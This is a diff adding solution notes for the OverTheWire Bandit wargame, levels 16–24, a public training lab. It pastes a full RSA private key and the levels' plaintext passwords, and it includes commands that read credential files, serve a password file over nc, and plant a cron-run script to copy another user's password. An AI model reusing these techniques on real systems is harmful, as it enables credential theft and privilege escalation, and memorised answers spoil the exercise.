@@ -134,7 +134,92 @@ echo "JQttfApK4SeyHwDlI9SXGR50qclOAil1" | openssl s_client localhost:31790
 # found something
 echo "JQttfApK4SeyHwDlI9SXGR50qclOAil1" | openssl s_client -ign_eof localhost:31790
 # got the cert
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
 
 # Bandit Level 17 → Level 18
 # create a new file and copy the cert content in it
-ssh bandit14@bandit.labs.overthewire.org -p 2220 -i <file>
+ssh bandit17@bandit.labs.overthewire.org -p 2220 -i <file>
+cat .bandit16.password
+# JQttfApK4SeyHwDlI9SXGR50qclOAil1
+diff passwords.new passwords.old
+# 42c42
+# < hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
+# ---
+# > glZreTEH1V3cGKL6g4conYqZqaEj0mte
+
+# Bandit Level 18 → Level 19
+ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
+# awhqfNnAbc1naukrpqDYcF95h7HoMTrC
+
+# Bandit Level 19 → Level 20
+ssh bandit19@bandit.labs.overthewire.org -p 2220
+./bandit20-do
+# Run a command as another user.
+#   Example: ./bandit20-do id
+./bandit20-do cat /etc/bandit_pass/bandit20
+# VxCazJaVykI6W36BkBU0mJTCM8rR95XT
+
+# Bandit Level 20 → Level 21
+ssh bandit20@bandit.labs.overthewire.org -p 2220
+nc -l -p 12345 < /etc/bandit_pass/bandit20 &
+# NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+
+# Bandit Level 21 → Level 22
+ssh bandit21@bandit.labs.overthewire.org -p 2220
+ll /etc/cron.d
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+# #!/bin/bash
+# chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+# cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+# WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+
+# Bandit Level 22 → Level 23
+ssh bandit22@bandit.labs.overthewire.org -p 2220
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+# QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+
+# Bandit Level 23 → Level 24
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+mkdir /tmp/tmp123
+touch /tmp/tmp123/password
+chmod +w /tmp/tmp123/password
+cd /var/spool/bandit24/foo
+nano test.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp123/password
+chmod +x test.sh
+cat /tmp/tmp123/password
+# VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
